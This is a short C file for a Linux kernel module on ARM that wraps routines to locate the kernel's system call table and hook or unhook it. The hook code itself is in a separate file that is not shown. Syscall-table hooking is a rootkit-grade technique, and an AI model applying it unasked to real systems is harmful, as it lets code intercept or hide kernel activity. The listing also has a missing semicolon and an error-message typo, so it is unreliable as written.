#include <linux/syscalls.h>
#include <linux/kallsyms.h>
// util.o
#include <linux/file.h>

#include "hook_arm.c"


/*
 * Export functions
 * to be used in top level functions
 */
static int install_hook(void)
{
	printk("install ARM hooks\n");

	if (get_init_mm() != 0) {
		printk(KERN_ERR "Couldn't file init_mm.\n");
		return 1;
	}

	if (get_sys_call_table_arm() != 0) {
		printk(KERN_ERR "Couldn't find sys_call_table.\n");
		return 2;
	}

	hook_sys_call_table_arm();
	return 0
}

static void uninstall_hook(void)
{
	unhook_sys_call_table_arm();
}
